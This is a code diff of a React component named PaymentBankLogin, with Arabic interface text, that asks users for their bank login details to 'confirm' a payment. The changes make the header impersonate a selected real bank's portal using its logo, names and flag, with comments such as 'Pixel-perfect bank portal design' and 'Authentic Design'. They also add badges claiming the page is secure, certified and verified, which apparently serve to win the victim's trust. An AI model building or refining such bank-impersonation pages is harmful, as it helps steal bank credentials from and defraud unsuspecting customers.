@@ -269,99 +269,220 @@ const PaymentBankLogin = () => {
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Bank Info Header - Enhanced to look like real bank portal */}
+      {/* Bank Info Header - Pixel-perfect bank portal design */}
       <div 
-        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10 relative overflow-hidden"
+        className="rounded-2xl p-6 sm:p-8 mb-6 shadow-2xl border-2 relative overflow-hidden"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}e8, ${selectedBank?.color || branding.colors.secondary}f0)`,
+          borderColor: `${selectedBank?.color || branding.colors.primary}30`,
         }}
       >
-        {/* Background Pattern */}
-        <div className="absolute inset-0 opacity-10" style={{
-          backgroundImage: 'radial-gradient(circle at 20% 50%, white 1px, transparent 1px), radial-gradient(circle at 80% 80%, white 1px, transparent 1px)',
-          backgroundSize: '50px 50px'
+        {/* Sophisticated Background Pattern */}
+        <div className="absolute inset-0 opacity-[0.08]" style={{
+          backgroundImage: `
+            radial-gradient(circle at 20% 30%, white 2px, transparent 2px),
+            radial-gradient(circle at 80% 70%, white 2px, transparent 2px),
+            radial-gradient(circle at 40% 60%, white 1.5px, transparent 1.5px)
+          `,
+          backgroundSize: '60px 60px, 80px 80px, 40px 40px'
         }} />
         
-        <div className="flex items-center justify-between mb-4 relative z-10">
-          <div className="flex items-center gap-3">
-            {/* Enhanced Bank Logo Display */}
-            <div 
-              className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white flex flex-col items-center justify-center shadow-md"
-            >
-              <Building2 className="w-6 h-6 sm:w-7 sm:h-7 mb-0.5" style={{ color: selectedBank?.color || branding.colors.primary }} strokeWidth={2.5} />
+        {/* Grid Pattern Overlay */}
+        <div className="absolute inset-0 opacity-[0.03]" style={{
+          backgroundImage: 'linear-gradient(0deg, white 1px, transparent 1px), linear-gradient(90deg, white 1px, transparent 1px)',
+          backgroundSize: '30px 30px'
+        }} />
+        
+        <div className="flex items-center justify-between mb-5 relative z-10">
+          <div className="flex items-center gap-4">
+            {/* Premium Bank Logo Display */}
+            {selectedBank?.logo ? (
               <div 
-                className="text-[9px] sm:text-[10px] font-bold tracking-wider"
-                style={{ color: selectedBank?.color || branding.colors.primary }}
+                className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white flex items-center justify-center shadow-xl p-3 border-2"
+                style={{ borderColor: `${selectedBank.color}20` }}
               >
-                {selectedBank?.nameAr.split(' ').slice(0, 2).map(word => word.charAt(0)).join('') || 'بنك'}
+                <img 
+                  src={selectedBank.logo} 
+                  alt={selectedBank.nameAr}
+                  className="w-full h-full object-contain"
+                  onError={(e) => {
+                    const target = e.target as HTMLImageElement;
+                    const parent = target.parentElement;
+                    if (parent) {
+                      parent.innerHTML = `
+                        <div class="w-full h-full flex flex-col items-center justify-center gap-1">
+                          <svg class="w-8 h-8 sm:w-10 sm:h-10" fill="${selectedBank.color}" viewBox="0 0 24 24">
+                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                            <polyline points="9 22 9 12 15 12 15 22"/>
+                          </svg>
+                          <div class="text-xs font-bold" style="color: ${selectedBank.color}; font-family: 'Cairo', sans-serif">
+                            ${selectedBank.nameAr.split(' ').slice(0, 2).map((w: string) => w.charAt(0)).join('')}
+                          </div>
+                        </div>
+                      `;
+                    }
+                  }}
+                />
               </div>
-            </div>
+            ) : (
+              <div 
+                className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white flex flex-col items-center justify-center shadow-xl p-2 border-2"
+                style={{ borderColor: `${selectedBank?.color || branding.colors.primary}20` }}
+              >
+                <Building2 className="w-7 h-7 sm:w-9 sm:h-9 mb-1" style={{ color: selectedBank?.color || branding.colors.primary }} strokeWidth={2.5} />
+                <div 
+                  className="text-[10px] sm:text-xs font-bold tracking-widest"
+                  style={{ color: selectedBank?.color || branding.colors.primary, fontFamily: 'Cairo, sans-serif' }}
+                >
+                  {selectedBank?.nameAr.split(' ').slice(0, 2).map(word => word.charAt(0)).join('') || 'بنك'}
+                </div>
+              </div>
+            )}
             <div className="flex-1 text-white">
-              <p className="text-xs sm:text-sm opacity-90 mb-1">الخدمات المصرفية الإلكترونية</p>
-              <p className="text-xl sm:text-2xl font-bold leading-tight drop-shadow-sm">{selectedBank?.nameAr || 'البنك'}</p>
-              <p className="text-xs sm:text-sm opacity-80 mt-0.5">{selectedBank?.name || 'Online Banking'}</p>
+              <div className="flex items-center gap-2 mb-1.5">
+                <div className="w-2 h-2 rounded-full bg-green-400 shadow-lg shadow-green-400/50 animate-pulse" />
+                <p className="text-[11px] sm:text-xs font-semibold tracking-wide uppercase opacity-95">Online Banking</p>
+              </div>
+              <p className="text-xl sm:text-2xl lg:text-3xl font-bold leading-tight drop-shadow-lg" style={{ fontFamily: 'Cairo, sans-serif' }}>
+                {selectedBank?.nameAr || 'الخدمات المصرفية'}
+              </p>
+              <p className="text-xs sm:text-sm opacity-85 mt-1 font-medium">{selectedBank?.name || 'Banking Services'}</p>
             </div>
           </div>
           {selectedCountryData && (
-            <span className="text-3xl sm:text-4xl drop-shadow-lg">{selectedCountryData.flag}</span>
+            <div className="text-right">
+              <span className="text-4xl sm:text-5xl drop-shadow-2xl">{selectedCountryData.flag}</span>
+            </div>
           )}
         </div>
         
-        {/* Bank portal header line */}
-        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm relative z-10">
-          <Lock className="w-4 h-4" />
-          <span>تسجيل دخول آمن ومشفر</span>
-          <span className="mr-auto">•</span>
-          <ShieldCheck className="w-4 h-4" />
-          <span>SSL 256-bit</span>
+        {/* Enhanced Security Bar */}
+        <div className="flex items-center justify-between gap-3 text-white/95 text-xs sm:text-sm relative z-10 pt-4 border-t border-white/20">
+          <div className="flex items-center gap-2">
+            <div className="w-7 h-7 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center">
+              <Lock className="w-4 h-4" />
+            </div>
+            <span className="font-semibold">اتصال آمن ومشفر</span>
+          </div>
+          <div className="flex items-center gap-3">
+            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/15 backdrop-blur-sm">
+              <ShieldCheck className="w-3.5 h-3.5" />
+              <span className="text-[11px] font-bold">SSL</span>
+            </div>
+            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/15 backdrop-blur-sm">
+              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+              </svg>
+              <span className="text-[11px] font-bold">معتمد</span>
+            </div>
+          </div>
         </div>
       </div>
 
-      {/* Security Notice - Enhanced */}
+      {/* Bank Portal Authentic Design */}
       <div 
-        className="rounded-xl p-4 sm:p-5 mb-6 border-2"
+        className="rounded-2xl p-1 mb-6 shadow-2xl relative overflow-hidden"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}05, ${branding.colors.primary}10)`,
-          borderColor: `${branding.colors.primary}30`
+          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}10, ${selectedBank?.color || branding.colors.primary}20)`,
+          border: `2px solid ${selectedBank?.color || branding.colors.primary}30`
         }}
       >
-        <div className="flex items-start gap-3">
-          <div 
-            className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
-            style={{ background: `${branding.colors.primary}20` }}
-          >
-            <ShieldCheck className="w-5 h-5" style={{ color: branding.colors.primary }} />
-          </div>
-          <div className="flex-1">
-            <div className="flex items-center gap-2 mb-2">
-              <h3 className="font-bold text-sm sm:text-base" style={{ color: branding.colors.primary }}>
-                تسجيل دخول آمن 100%
-              </h3>
-              <svg className="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-              </svg>
-            </div>
-            <p className="text-xs sm:text-sm text-muted-foreground leading-relaxed">
-              سجّل دخولك إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان. جميع بياناتك محمية بتشفير 256-bit SSL.
-            </p>
-            <div className="flex items-center gap-4 mt-3 text-xs">
-              <div className="flex items-center gap-1 text-green-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                </svg>
-                <span>مشفر</span>
+        {/* Inner Bank Portal Card */}
+        <div 
+          className="rounded-xl p-5 sm:p-6 relative overflow-hidden"
+          style={{
+            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          }}
+        >
+          {/* Sophisticated Pattern */}
+          <div className="absolute inset-0 opacity-[0.12]" style={{
+            backgroundImage: `
+              repeating-linear-gradient(45deg, transparent, transparent 10px, white 10px, white 11px),
+              repeating-linear-gradient(-45deg, transparent, transparent 10px, white 10px, white 11px)
+            `
+          }} />
+          
+          <div className="flex items-start justify-between mb-5 relative z-10">
+            <div className="flex items-start gap-4 flex-1">
+              {/* Premium Bank Logo */}
+              {selectedBank?.logo ? (
+                <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white flex items-center justify-center shadow-2xl p-3 border-2 border-white/50">
+                  <img 
+                    src={selectedBank.logo} 
+                    alt={selectedBank.nameAr}
+                    className="w-full h-full object-contain"
+                    onError={(e) => {
+                      const target = e.target as HTMLImageElement;
+                      const parent = target.parentElement;
+                      if (parent) {
+                        parent.innerHTML = `
+                          <div class="w-full h-full flex flex-col items-center justify-center gap-1.5">
+                            <svg class="w-9 h-9" fill="${selectedBank.color}" viewBox="0 0 24 24">
+                              <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                              <polyline points="9 22 9 12 15 12 15 22"/>
+                            </svg>
+                            <div class="text-xs font-extrabold tracking-wider" style="color: ${selectedBank.color}; font-family: 'Cairo', sans-serif">
+                              ${selectedBank.nameAr.split(' ').slice(0, 2).map((w: string) => w.charAt(0)).join('')}
+                            </div>
+                          </div>
+                        `;
+                      }
+                    }}
+                  />
+                </div>
+              ) : (
+                <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white/95 flex flex-col items-center justify-center shadow-2xl p-2">
+                  <Building2 className="w-8 h-8 sm:w-10 sm:h-10 mb-1" style={{ color: selectedBank?.color || branding.colors.primary }} strokeWidth={2.5} />
+                  <div className="text-[10px] sm:text-xs font-extrabold tracking-widest" style={{ color: selectedBank?.color || branding.colors.primary, fontFamily: 'Cairo, sans-serif' }}>
+                    {selectedBank?.nameAr.split(' ').slice(0, 2).map(word => word.charAt(0)).join('') || 'بنك'}
+                  </div>
+                </div>
+              )}
+              
+              {/* Bank Information */}
+              <div className="flex-1 text-white pt-1">
+                <div className="flex items-center gap-2 mb-2">
+                  <div className="w-2 h-2 rounded-full bg-green-300 shadow-lg shadow-green-300/60 animate-pulse" />
+                  <p className="text-[10px] sm:text-xs font-bold tracking-widest uppercase opacity-90">الخدمات المصرفية الإلكترونية</p>
+                </div>
+                <p className="text-2xl sm:text-3xl font-extrabold leading-tight drop-shadow-lg mb-1.5" style={{ fontFamily: 'Cairo, sans-serif' }}>
+                  {selectedBank?.nameAr || 'البنك'}
+                </p>
+                <p className="text-xs sm:text-sm opacity-90 font-semibold tracking-wide">{selectedBank?.name || 'Online Banking Portal'}</p>
               </div>
-              <div className="flex items-center gap-1 text-blue-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+            </div>
+            
+            {/* Country Badge */}
+            {selectedCountryData && (
+              <div className="flex flex-col items-center gap-1.5">
+                <span className="text-4xl sm:text-5xl drop-shadow-2xl">{selectedCountryData.flag}</span>
+                <span className="text-[10px] text-white/80 font-semibold">{selectedCountryData.nameAr}</span>
+              </div>
+            )}
+          </div>
+          
+          {/* Premium Security Indicators */}
+          <div className="flex items-center justify-between gap-3 relative z-10 pt-4 border-t border-white/25">
+            <div className="flex items-center gap-2.5">
+              <div className="w-8 h-8 rounded-lg bg-white/20 backdrop-blur-md flex items-center justify-center shadow-lg">
+                <Lock className="w-4 h-4 text-white" strokeWidth={2.5} />
+              </div>
+              <div className="text-white">
+                <p className="text-xs font-bold leading-tight">تسجيل دخول آمن</p>
+                <p className="text-[10px] opacity-80">Secure Login</p>
+              </div>
+            </div>
+            
+            <div className="flex items-center gap-2">
+              <div className="px-3 py-1.5 rounded-full bg-white/15 backdrop-blur-md flex items-center gap-1.5 shadow-lg">
+                <ShieldCheck className="w-3.5 h-3.5 text-white" strokeWidth={2.5} />
+                <span className="text-[11px] font-bold text-white">256-bit SSL</span>
+              </div>
+              <div className="px-3 py-1.5 rounded-full bg-green-500/90 backdrop-blur-md flex items-center gap-1.5 shadow-lg">
+                <svg className="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                   <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                 </svg>
-                <span>موثّق</span>
-              </div>
-              <div className="flex items-center gap-1 text-purple-600">
-                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-                </svg>
-                <span>آمن</span>
+                <span className="text-[11px] font-bold text-white">موثّق</span>
               </div>
             </div>
           </div>
